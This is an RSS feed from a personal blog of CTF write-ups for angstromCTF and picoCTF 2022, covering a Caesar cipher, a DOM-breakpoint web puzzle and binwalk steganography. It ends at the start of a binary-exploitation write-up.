<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="rss.xsl"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Kobbi's Knowledgebase Blog</title>
        <link>https://kbbgl.github.io/blog</link>
        <description>Kobbi's Knowledgebase Blog</description>
        <lastBuildDate>Thu, 26 Sep 2024 20:59:28 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Capture the Flag Write-ups]]></title>
            <link>https://kbbgl.github.io/blog/intro</link>
            <guid>https://kbbgl.github.io/blog/intro</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[This is a collection of documents describing how CTF challenges were solved.]]></description>
            <content:encoded><![CDATA[<p>This is a collection of documents describing how CTF challenges were solved.</p>
<p>Each folder contains a particular CTF and its solutions.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[angstromCTF 2022]]></title>
            <link>https://kbbgl.github.io/blog/angstrom_2022/README</link>
            <guid>https://kbbgl.github.io/blog/angstrom_2022/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[April 29, 2022 – May 4, 2022.]]></description>
            <content:encoded><![CDATA[<p>April 29, 2022 – May 4, 2022.</p>
<p><a href="https://2022.angstromctf.com/" target="_blank" rel="noopener noreferrer">https://2022.angstromctf.com/</a></p>
<p>Finished with X points.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[picoCTF 2022]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Mar 15, 2022 – Mar 29, 2022.]]></description>
            <content:encoded><![CDATA[<p>Mar 15, 2022 – Mar 29, 2022.</p>
<p>Finished with 8200 points.</p>
<p><img decoding="async" loading="lazy" src="https://kbbgl.github.io/assets/images/picoctf_2022_scoreboard-2d9a4c6e3fddf69e6ae5ba39b9673fc9.png" width="933" height="923" class="img_ev3q"></p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Caesar and Desister]]></title>
            <link>https://kbbgl.github.io/blog/angstrom_2022/crypto/caesar_and_desister/README</link>
            <guid>https://kbbgl.github.io/blog/angstrom_2022/crypto/caesar_and_desister/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Points: 40]]></description>
            <content:encoded><![CDATA[<p>Points: 40</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/angstrom_2022/crypto/caesar_and_desister/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>After making dumb jokes about cryptography to all his classmates, clam got a cease and desist filed against him! When questioned in court, his only comment was "clam's confounding Caesar cipher creates confusing cryptographic challenges." Needless to say, the judge wasn't very happy. Clam was sentenced to 5 years of making dumb Caesar cipher challenges. Here's one of them:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sulx{klgh_jayzl_lzwjw_ujqhlgyjshzwj_kume}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Wrote <a href="https://kbbgl.github.io/assets/files/cipher-29a7cb584216202cdef0a4fe0b64f21b.py" target="_blank">a script</a> to generate the decryption:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./cipher.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Trying to decipher sulx{klgh_jayzl_lzwjw_ujqhlgyjshzwj_kume}...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'s' + 8 =&gt; a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'u' + 8 =&gt; c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'l' + 8 =&gt; t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'x' + 8 =&gt; f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'k' + 8 =&gt; s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'l' + 8 =&gt; t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'g' + 8 =&gt; o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'h' + 8 =&gt; p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'j' + 8 =&gt; r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'a' + 8 =&gt; i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'y' + 8 =&gt; g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'z' + 8 =&gt; h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'l' + 8 =&gt; t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'l' + 8 =&gt; t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'z' + 8 =&gt; h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'w' + 8 =&gt; e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'j' + 8 =&gt; r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'w' + 8 =&gt; e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'u' + 8 =&gt; c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'j' + 8 =&gt; r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'q' + 8 =&gt; y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'h' + 8 =&gt; p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'l' + 8 =&gt; t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'g' + 8 =&gt; o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'y' + 8 =&gt; g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'j' + 8 =&gt; r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'s' + 8 =&gt; a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'h' + 8 =&gt; p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'z' + 8 =&gt; h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'w' + 8 =&gt; e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'j' + 8 =&gt; r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'k' + 8 =&gt; s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'u' + 8 =&gt; c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'m' + 8 =&gt; u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'e' + 8 =&gt; m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">actf{stop_right_there_cryptographer_scum}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[The Flash]]></title>
            <link>https://kbbgl.github.io/blog/angstrom_2022/web/the_flash/README</link>
            <guid>https://kbbgl.github.io/blog/angstrom_2022/web/the_flash/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Points: 40]]></description>
            <content:encoded><![CDATA[<p>Points: 40</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/angstrom_2022/web/the_flash/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>The new Justice League movies nerfed the Flash, so clam made his <a href="https://the-flash.web.actf.co/" target="_blank" rel="noopener noreferrer">own rendition</a>! Can you get the flag before the Flash swaps it out at the speed of light?</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kbbgl.github.io/blog/angstrom_2022/web/the_flash/README#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h2>
<p>When loading the page, we can see that we're greeted with a paragraph saying:</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">p</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">flash</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">actf{this_is_not_the_flag}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">p</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Reviewing the <a href="https://kbbgl.github.io/assets/files/flash-e67af6407757bd42aaab5080db0c5323.js" target="_blank">source code</a> and using the browser developer tools Sources tab, I noticed that there was a section where the element above (variable <code>x</code>) is updated based on some interval:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'getElementById'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token comment" style="color:#999988;font-style:italic">//..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">setInterval</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token arrow operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// x[_0x24a935(0xdc, '1WY2')]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then noticed that the paragraph <code>innerText</code> was actually being modified in short flashes. These flashes were too fast for me to actually see what the paragraph changed into.</p>
<p>I decided to utilize the Chrome developer tools feature to <a href="https://developer.chrome.com/docs/devtools/javascript/breakpoints/#dom" target="_blank" rel="noopener noreferrer">define a breakpoint when a DOM element changes</a>.</p>
<p>In the Elements tab, I right clicked on the <code>body</code> tag &gt; Break on &gt; subtree modifications. The next time the <code>p</code> element refreshed, the debugger paused execution and the flag was exposed:</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">p</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">flash</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">actf{sp33dy_l1ke_th3_fl4sh}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">p</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Confetti]]></title>
            <link>https://kbbgl.github.io/blog/angstrom_2022/misc/confetti/README</link>
            <guid>https://kbbgl.github.io/blog/angstrom_2022/misc/confetti/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Points: 40]]></description>
            <content:encoded><![CDATA[<p>Points: 40
Category: <a href="https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography" target="_blank" rel="noopener noreferrer">Steganography</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/angstrom_2022/misc/confetti/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>"From the sky, drop like confetti All eyes on me, so V.I.P All of my dreams, from the sky, drop like confetti" - Little Mix</p>
<p><a href="https://files.actf.co/bcf3009b7dc908d24847db01790891ce8453e900fa0b15f1f214f5392c1aabd4/confetti.png" target="_blank" rel="noopener noreferrer">confetti</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="https://kbbgl.github.io/blog/angstrom_2022/misc/confetti/README#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file confetti.png</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">confetti.png: PNG image data, 3971 x 2918, 8-bit/color RGBA, non-interlaced</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then used <code>binwalk</code> to check if there were any hidden files inside the image</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">binwalk confetti.png</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0             0x0             PNG image, 3971 x 2918, 8-bit/color RGBA, non-interlaced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">115           0x73            Zlib compressed data, default compression</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">967339        0xEC2AB         PNG image, 3971 x 2918, 8-bit/color RGBA, non-interlaced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">967454        0xEC31E         Zlib compressed data, default compression</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1934678       0x1D8556        PNG image, 3971 x 2918, 8-bit/color RGBA, non-interlaced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1934732       0x1D858C        TIFF image data, big-endian, offset of first image directory: 8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3180408       0x308778        PNG image, 3971 x 2918, 8-bit/color RGBA, non-interlaced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3180523       0x3087EB        Zlib compressed data, default compression</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see that there are some more images and compressed archives. Let's extract them into the filesystem:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">binwalk --dd=".*" -C="$(pwd)/extracted"  confetti.png</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ll ./extracted/_confetti.png.extracted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">total 21M</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 4.0M May  4 15:03 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 2.2M May  4 15:03 1D8556</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 2.2M May  4 15:03 1D858C</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 945K May  4 15:03 308778</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi    0 May  4 15:03 3087EB</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 945K May  4 15:03 3087EB-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi    0 May  4 15:03 73</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 4.0M May  4 15:03 73-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 3.1M May  4 15:03 EC2AB</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi    0 May  4 15:03 EC31E</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 kobbi kobbi 3.1M May  4 15:03 EC31E-0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we look at the <code>1D8556</code> in an image viewer, we see the flag:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file extracted/_confetti.png.extracted/1D8556</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extracted/_confetti.png.extracted/1D8556: PNG image data, 3971 x 2918, 8-bit/color RGBA, non-interlaced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eog 1D8556</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[baby3]]></title>
            <link>https://kbbgl.github.io/blog/angstrom_2022/reverse_engineering/baby3/README</link>
            <guid>https://kbbgl.github.io/blog/angstrom_2022/reverse_engineering/baby3/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Points: 40]]></description>
            <content:encoded><![CDATA[<p>Points: 40</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/angstrom_2022/reverse_engineering/baby3/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p><a href="https://files.actf.co/6e318c7c6d665c38f3f42afb989fe8c025349bd6541242ca5271543879a02fdf/chall" target="_blank" rel="noopener noreferrer">This program</a> doesn't do anything.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[basic-file-exploit]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/basic_file_exploit/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/basic_file_exploit/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[https://play.picoctf.org/events/70/challenges/challenge/252]]></description>
            <content:encoded><![CDATA[<p><a href="https://play.picoctf.org/events/70/challenges/challenge/252" target="_blank" rel="noopener noreferrer">https://play.picoctf.org/events/70/challenges/challenge/252</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/basic_file_exploit/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!</p>
<p>Connect to the program with netcat:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 52682</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The program's source code with the flag redacted can be downloaded <a href="https://artifacts.picoctf.net/c/537/program-redacted.c" target="_blank" rel="noopener noreferrer">here</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="compile-and-test">Compile and Test<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/basic_file_exploit/README#compile-and-test" class="hash-link" aria-label="Direct link to Compile and Test" title="Direct link to Compile and Test">​</a></h2>
<p>Let's download and compile the program using <a href="https://kbbgl.github.io/c/compile_c.sh"><code>compile.sh</code></a>:</p>
